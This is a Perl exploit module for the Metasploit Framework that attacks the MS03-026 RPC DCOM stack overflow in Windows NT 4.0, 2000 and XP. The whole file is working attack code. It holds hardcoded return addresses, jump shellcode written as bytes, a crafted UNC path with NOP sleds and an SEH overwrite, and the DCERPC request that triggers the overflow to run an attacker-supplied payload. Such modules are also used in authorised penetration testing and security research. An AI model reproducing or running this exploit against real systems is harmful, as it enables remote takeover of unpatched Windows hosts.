package Msf::Exploit::msrpc_dcom_ms03_026;
use base "Msf::Exploit";
use Pex::DCERPC;
use strict;

my $advanced = { };

my $info =
{
    'Name'  => 'Microsoft RPC DCOM MSO3-026',
     'Version'  => '$Revision: 1.12 $',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]' ],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32' ],
    'Priv'  => 1,
    'AutoOpts'  => { 'EXITFUNC' => 'thread' },
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The target port', 135],
                },

    'Payload' => {
                 'Space'  => 998,  # size % 12 == 0
                 'BadChars'  => "\x00\x0a\x0d\x5c\x5f\x2f\x2e",
                 },
    
    'Description'  => qq{
        This module exploits a stack overflow in the RPCSS service, this vulnerability
        was originally found by the Last Stage of Delirium research group and has been
        widely exploited ever since. This module can exploit the English versions of 
        Windows NT 4.0 SP6, Windows 2000, and Windows XP, all in one request :)
    },
                
    'Refs'  =>   [  
                    'http://www.osvdb.org/2100',
                    'http://www.microsoft.com/technet/security/bulletin/MS03-026.mspx'
                 ],
    'DefaultTarget' => 0,
    'Targets' => [ 
                    # Windows NT 4.0 SP6a (esp) 0x77f33723
                    # Windows 2000 writable address + jmp+0xe0                    
                    # Windows 2000 Universal (ebx) 0x0018759f
                    # Windows XP | XP SP0/SP1 (pop/pop/ret)
                   ['Windows NT SP6/2K/XP ALL', 0x77f33723, 0x7ffde0eb, 0x0018759f, 0x01001c59],
                 ],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');
    my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
    
    my $target = $self->Targets->[$target_idx];
    my ($res, $rpc);

    my $s = Msf::Socket->new();
    if (! $s->Tcp($target_host, $target_port))
    {
        $self->PrintLine("");
        $self->PrintLine("[*] Error: " . $s->GetError());
        return(0);
    }

    my $bind = Pex::DCERPC::Bind(Pex::DCERPC::UUID('REMACT'), '0.0', Pex::DCERPC::DCEXFERSYNTAX(), '2');
    $s->Send($bind);
    $res = $s->Recv(60, 5);
    $rpc = Pex::DCERPC::DecodeResponse($res);
    
    if ($rpc->{'AckResult'} != 0) {
        $self->PrintLine("[*] Could not bind to REMACT interface");
        return(0);
    }

    $self->PrintLine("[*] Connected to REMACT with group ID 0x".sprintf("%x", $rpc->{'AssocGroup'}));

    # The following was inspired by Dino Dai Zovi's description of his exploit

    # 360 is a magic number for cross-exploitation :)
    my $xpseh  = Pex::Utils::EnglishText(360);
    
    # jump to [esp-4] - (distance to shellcode)
    my $jmpsc =  "\x8b\x44\x24\xfc".     # mov eax,[esp-0x4]
                 "\x05\xe0\xfa\xff\xff". # add eax,0xfffffae0 (sub eax, 1312)
                 "\xff\xe0";             # jmp eax

    substr($xpseh, 306, 2, "\xeb\x06");
    substr($xpseh, 310, 4, pack('V', $target->[4]));    
    substr($xpseh, 314, length($jmpsc), $jmpsc);

    # Create the evil UNC path used in the overflow
    my $uncpath =
        ("\x90" x 32).
        "\xeb\x10\xeb\x19".       # When attacking NT 4.0, jump over 2000/XP return
        pack("V", $target->[3]).  # Return address for 2000 (ebx)
        pack("V", $target->[1]).  # Return address for NT 4.0 (esi)
        pack("V", $target->[2]).  # Writable address on 2000 and jmp for NT 4.0
        ("\x90" x 88).
        "\xeb\x04\xff\xff\xff\xff". 
        ("\x90" x 8).
        "\xeb\x04\xeb\x04".
        ("\x90" x 4).
        "\xeb\x04\xff\xff\xff\xff". 
        $shellcode. $xpseh.
        "\x5c\x00\x41\x00\x00\x00\x00\x00\x00\x00";
    
      # This is the rpc cruft needed to trigger the vuln API
      my $stubdata =
        "\x05\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x58\x7d\x75\x75".
        "\x40\xeb\xc6\x47\xbc\x71\x4e\xa7\x1c\xd0\xb5\x97\x00\x00\x00\x00".
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
        "\x00\x00\x09\x00\x20\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00".
        "\x5c\x00\x5c\x00".
        $uncpath .
        "\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00".
        "\x68\x1c\x09\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
        "\xc0\x00\x00\x00\x00\x00\x00\x46\x01\x00\x00\x00\x01\x00\x00\x00".
        "\x07\x00";

    # Pad, calculate, set number of wide chars in path
    my $pathsz = ((length($uncpath) + 11) & ~7) / 2;
    substr($stubdata, 52, 4, pack("V", $pathsz));
    substr($stubdata, 60, 4, pack("V", $pathsz));

    # Exploit in a fairly clean manner...
    my $exploit = Pex::DCERPC::Request(0, $stubdata);
    $s->Send($exploit);
    $res = $s->Recv(-1, 5);
    $rpc = Pex::DCERPC::DecodeResponse($res);
    if ($rpc && $rpc->{'Type'} eq 'fault') {
        $self->PrintLine("[*] Call to RPC service failed with error ".sprintf("0x%.8x",$rpc->{'Status'}));
        $self->PrintLine("[*] This probably means that the system is patched");
        return(0);
    }
}

